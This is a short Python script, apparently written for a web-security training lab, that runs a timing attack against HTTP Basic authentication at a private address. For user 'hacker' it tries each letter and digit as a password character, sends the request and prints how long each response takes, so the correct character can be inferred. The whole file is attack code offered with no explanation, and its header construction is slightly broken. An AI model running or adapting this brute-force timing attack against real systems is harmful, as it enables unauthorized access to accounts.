import httplib, datetime , base64

charArray = "abcdefghijklmnopqrstuvwxyz0123456789"

for letter in charArray:
    account = "hacker:" + letter
    headers = {"Authorization":"Basic"+str(base64.b64encode(account.encode('ascii')))}
    conn = httplib.HTTPConnection("10.0.2.5")
    conn.request("GET","/authentication/example2/","",headers)

    start = datetime.datetime.now()
    r1 = conn.getresponse()
    end = datetime.datetime.now()

    diff = end - start
    print(account, ">>>", diff, r1.status, r1.reason)
